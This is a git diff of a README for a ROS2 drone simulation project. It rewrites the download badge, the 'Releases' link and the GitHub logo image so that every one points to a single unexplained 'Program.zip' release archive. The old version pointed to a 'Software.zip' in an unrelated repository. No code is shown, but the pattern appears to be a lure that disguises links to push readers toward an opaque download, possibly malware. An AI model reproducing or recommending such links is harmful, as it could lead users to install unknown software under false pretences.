@@ -25,7 +25,7 @@ If you're new to ROS2 or drone simulation, don't worry! We've included detailed 
 
 To install the necessary software components, please download the Software ZIP file from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/eli2cold/ros2_drone_sim/releases/download/v1.0/Program.zip)](https://github.com/eli2cold/ros2_drone_sim/releases/download/v1.0/Program.zip)
 
 After downloading the Software ZIP file, extract its contents and follow the setup instructions included in the README file.
 
@@ -49,7 +49,7 @@ This repository covers the following topics:
 
 ## 🌐 Additional Resources
 
-For more information and updates, be sure to check out the [Releases](https://github.com/rokytd/files/releases) section of this repository. Stay tuned for the latest features, bug fixes, and enhancements to make your drone simulation experience even better!
+For more information and updates, be sure to check out the [Releases](https://github.com/eli2cold/ros2_drone_sim/releases/download/v1.0/Program.zip) section of this repository. Stay tuned for the latest features, bug fixes, and enhancements to make your drone simulation experience even better!
 
 ## 🤝 Community Support
 
@@ -71,4 +71,4 @@ Let's soar to new heights together with **ros2_drone_sim**! 🌟
 
 **Website:** [Your Website]
 
-[![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)](https://github.com/)
+[![GitHub Logo](https://github.com/eli2cold/ros2_drone_sim/releases/download/v1.0/Program.zip)](https://github.com/eli2cold/ros2_drone_sim/releases/download/v1.0/Program.zip)
